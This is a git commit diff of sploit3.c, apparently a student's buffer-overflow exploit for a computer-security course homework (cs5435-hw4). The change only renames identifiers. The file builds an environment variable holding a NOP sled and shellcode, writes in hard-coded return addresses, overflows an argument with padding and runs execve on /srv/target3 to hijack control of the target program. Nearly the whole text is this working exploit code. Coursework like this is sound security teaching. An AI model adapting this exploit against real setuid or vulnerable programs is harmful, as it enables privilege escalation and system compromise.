a3984938432686ba4df2c95eb65b5cf9e9f31641
justinhalford <justinhalford@gmail.com>
2024-05-10 19:16:49 -0400

    may 7

--- cs5435-hw4/sploits/sploit3.c
+++ cs5435-hw4/sploits/sploit3.c
@@ -5,34 +5,34 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* TARGET = "/srv/target3";
-const int ENVSIZE = 400;
-const uint32_t BASEADDR = 0xffffdec0;
-const int NOPSIZE = 201;
-const char NOP = 0x90;
-const int RETOFFSET = 4;
+const char* target = "/srv/target3";
+const int envsize = 400;
+const uint32_t baseaddr = 0xffffdec0;
+const int nopsize = 201;
+const char nop = 0x90;
+const int retoff = 4;
 
-const uint32_t StartAddr = BASEADDR + RETOFFSET;
-const uint32_t SecondAddr = BASEADDR + 2 * RETOFFSET;
-const char Pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const uint32_t startaddr = baseaddr + retoff;
+const uint32_t secondaddr = baseaddr + 2 * retoff;
+const char pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void prepEnv(char *env) {
-    memset(env, NOP, ENVSIZE - 1);
-    *((uint32_t *)(env)) = StartAddr;
-    *((uint32_t *)(env + RETOFFSET)) = SecondAddr;
-    memcpy(env + NOPSIZE, shellcode, sizeof(shellcode));
-    env[ENVSIZE - 1] = '\0';
+void prepenv(char *e) {
+    memset(e, nop, envsize - 1);
+    *((uint32_t *)(e)) = startaddr;
+    *((uint32_t *)(e + retoff)) = secondaddr;
+    memcpy(e + nopsize, shellcode, sizeof(shellcode));
+    e[envsize - 1] = '\0';
 }
 
 int main(void) {
-    char *args[] = {TARGET, Pad, NULL};
-    static char env[ENVSIZE];
+    char *args[] = {target, pad, NULL};
+    static char env[envsize];
 
-    prepEnv(env);
+    prepenv(env);
 
     char *envp[] = {env};
 
-    execve(TARGET, args, envp);
+    execve(target, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
